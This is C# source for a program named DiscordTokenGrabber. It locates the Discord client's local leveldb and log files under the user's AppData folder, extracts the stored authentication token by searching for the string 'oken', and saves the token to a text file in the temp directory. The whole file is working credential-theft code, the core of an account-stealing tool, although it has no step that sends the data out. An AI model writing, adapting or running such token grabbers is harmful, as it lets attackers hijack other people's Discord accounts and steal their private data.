using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;

namespace DiscordTokenGrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            string result = DiscordToken();
            try { File.Delete(Path.GetTempPath() + "\\DiscordToken.txt"); } catch { }
            File.WriteAllText(Path.GetTempPath() + "\\DiscordToken.txt", result);
        }
        public static string DiscordToken()
        {
            string result;
            try
            {
                string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
                if (!dotldb(ref text))
                {
                    dotlog(ref text);
                }
                Thread.Sleep(100);
                string text2 = tokenx(text, text.EndsWith(".log"));
                if (text2 == "")
                {
                    text2 = "N/A";
                }
                result = text2;
            }
            catch
            {
                result = "Not Found!";
            }
            return result;
        }
        private static bool dotldb(ref string stringx)
        {
            bool result;
            try
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {

                        if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".ldb");
                        }
                    }
                    result = stringx.EndsWith(".ldb");
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }
            return result;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            string result;
            try
            {
                if (stringx.Contains(".log"))
                {
                    stringx = Path.GetDirectoryName(stringx) + "\\LogCopy.txt";
                }
                byte[] bytes = File.ReadAllBytes(stringx);
                string @string = Encoding.UTF8.GetString(bytes);
                string text = "";
                string text2 = @string;
                while (text2.Contains("oken"))
                {
                    string[] array = IndexOf(text2).Split(new char[]
                    {
                        '"'
                    });
                    text = array[0];
                    text2 = string.Join("\"", array);
                    if (boolx && text.Length == 59)
                    {
                        break;
                    }
                }
                result = text;
                if (stringx.Contains("LogCopy.txt"))
                {
                    File.Delete(stringx);
                }
            }
            catch
            {
                if (stringx.Contains("LogCopy.txt"))
                {
                    File.Delete(stringx);
                }
                result = "";
            }
            return result;
        }
        public static string dotlog(ref string stringx)
        {
            bool result;
            try
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {
                        bool LogText = ReadLogFile(fileInfo.FullName);
                        if (fileInfo.Name.EndsWith(".log") && LogText)
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".log").ToString();
                        }
                    }
                    result = stringx.EndsWith(".log");
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }
            return result.ToString();
        }
        static bool ReadLogFile(string path)
        {
            string newpath = Path.GetDirectoryName(path) + "\\LogCopy.txt";
            File.Copy(path, newpath, true);
            bool Result = File.ReadAllText(newpath).Contains("oken");
            return Result;
        }
        private static string IndexOf(string stringx)
        {
            string result;
            try
            {
                string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
                {
                    '"'
                });
                List<string> list = new List<string>();
                list.AddRange(array);
                list.RemoveAt(0);
                array = list.ToArray();
                result = string.Join("\"", array);
            }
            catch
            {
                result = null;
            }
            return result;
        }
    }
}
